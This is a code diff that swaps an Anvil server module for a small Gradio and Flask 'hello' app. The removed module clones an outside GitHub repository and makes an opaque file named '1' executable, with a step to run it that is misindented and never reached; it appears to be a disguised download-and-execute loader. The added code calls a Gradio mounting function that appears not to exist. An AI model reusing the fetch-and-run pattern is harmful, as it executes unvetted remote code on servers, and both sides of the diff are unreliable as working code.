@@ -1,64 +1,21 @@
-import anvil.server
-import os
-import subprocess
-import sys
+import gradio as gr
+from flask import Flask
 
-def run_command(command, cwd=None):
-  """Run a shell command and return the output"""
-  try:
-    result = subprocess.run(command, shell=True, cwd=cwd, check=True, 
-                            capture_output=True, text=True)
-    print(f"✅ Command succeeded: {command}")
-    if result.stdout:
-      print(result.stdout)
-    return True
-  except subprocess.CalledProcessError as e:
-    print(f"❌ Command failed: {command}")
-    print(f"Error: {e.stderr}")
-    return False
+# 1. Create your Flask app
+flask_app = Flask(__name__)
 
-def main():
-  # 1. Clone the repository
-  repo_url = "https://github.com/susan4y/1v2.git"
-  print(f"Cloning repository: {repo_url}")
+@flask_app.route("/api")
+def hello():
+    return {"message": "Hello from Flask!"}
 
-  if not run_command(f"git clone {repo_url}"):
-    sys.exit(1)
+# 2. Create your Gradio interface
+def greet(name):
+    return f"Hello {name}!"
 
-    # 2. Move into the directory
-  repo_dir = "1v2"
-  print(f"Changing directory to: {repo_dir}")
+demo = gr.Interface(fn=greet, inputs="text", outputs="text")
 
-  # Check if directory exists
-  if not os.path.exists(repo_dir):
-    print(f"❌ Directory '{repo_dir}' not found after cloning")
-    sys.exit(1)
-
-    # 3. Make the file executable
-    # Note: The command should be "chmod +x 1" (assuming the file is named "1")
-    # This is correct if there's a file named "1" in the directory
-  print("Making file '1' executable...")
-  if not run_command("chmod +x 1", cwd=repo_dir):
-    sys.exit(1)
-
-    # 4. Run the executable
-    print("Running ./1...")
-    print("-" * 50)
-    if not run_command("./1", cwd=repo_dir):
-        sys.exit(1)
-    print("-" * 50)
+# 3. Mount Flask inside Gradio and launch
+app = gr.mount_wsgi_app(flask_app)
 
 if __name__ == "__main__":
-    main()
-# This is a server module. It runs on the Anvil server,
-# rather than in the user's browser.
-#
-# To allow anvil.server.call() to call functions here, we mark
-# them with @anvil.server.callable.
-# Here is an example - you can replace it with your own:
-#
-# @anvil.server.callable
-# def say_hello(name):
-#   print("Hello, " + name + "!")
-#   return 42
-#
+    demo.launch()
